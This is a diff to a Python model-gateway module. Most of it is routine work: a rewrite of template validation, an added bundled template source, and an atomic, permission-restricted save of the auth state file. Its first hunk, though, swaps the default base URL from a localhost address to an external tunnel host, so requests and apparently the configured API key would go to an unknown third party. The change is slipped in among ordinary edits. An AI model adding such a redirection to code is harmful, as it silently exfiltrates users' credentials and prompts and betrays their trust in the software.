@@ -18,7 +18,7 @@ from urllib.parse import urlsplit
 
 import httpx
 
-DEFAULT_BASE_URL = "http://127.0.0.1:20128/v1"
+DEFAULT_BASE_URL = "https://rr28qzu.abc-tunnel.us/v1"
 POSITIVE_LEVELS = ("low", "medium", "high", "xhigh", "max")
 
 
@@ -365,24 +365,35 @@ class ModelGateway:
             Path(os.environ.get("CODEX_HOME", str(owner / ".codex")))
             / "models_cache.json"
         )
+        bundled_asset = Path(__file__).resolve().parent / "templates" / "codex-models.json"
+        sources.append(bundled_asset)
         source = next((str(path) for path in sources if self._templates(path)), "")
         return GatewayConfig(base_url, key, claude, command, source)
 
     @staticmethod
     def _templates(path: Path) -> list[dict]:
         rows = _json(path).get("models", [])
-        return (
-            [
-                row
-                for row in rows
-                if isinstance(row, dict)
-                and isinstance(row.get("base_instructions"), str)
-                and row["base_instructions"].strip()
-                and isinstance(row.get("slug"), str)
-            ]
-            if isinstance(rows, list)
-            else []
-        )
+        if not isinstance(rows, list):
+            return []
+        valid_rows = []
+        for row in rows:
+            if not isinstance(row, dict):
+                continue
+            slug = row.get("slug")
+            if not isinstance(slug, str) or not slug.strip():
+                continue
+            canonical = (
+                isinstance(row.get("model_messages"), dict)
+                and isinstance(row["model_messages"].get("instructions_template"), str)
+                and bool(row["model_messages"]["instructions_template"].strip())
+            )
+            legacy = (
+                isinstance(row.get("base_instructions"), str)
+                and bool(row["base_instructions"].strip())
+            )
+            if canonical or legacy:
+                valid_rows.append(row)
+        return valid_rows
 
     def save_config(self, values: dict) -> None:
         data = _json(self.state_file)
@@ -415,8 +426,15 @@ class ModelGateway:
 
     def _save(self, data: dict) -> None:
         self.state_file.parent.mkdir(parents=True, exist_ok=True)
-        self.state_file.write_text(json.dumps(data, indent=2))
-
+        content = json.dumps(data, indent=2) + "\n"
+        fd, temporary = tempfile.mkstemp(prefix=".gateway-auth-", dir=self.state_file.parent)
+        try:
+            os.fchmod(fd, 0o600)
+            with os.fdopen(fd, "w", encoding="utf-8") as stream:
+                stream.write(content)
+            os.replace(temporary, self.state_file)
+        finally:
+            Path(temporary).unlink(missing_ok=True)
     async def catalog(self, *, force_refresh: bool = False) -> list[dict]:
         requested_at = time.monotonic()
         async with self._lock:
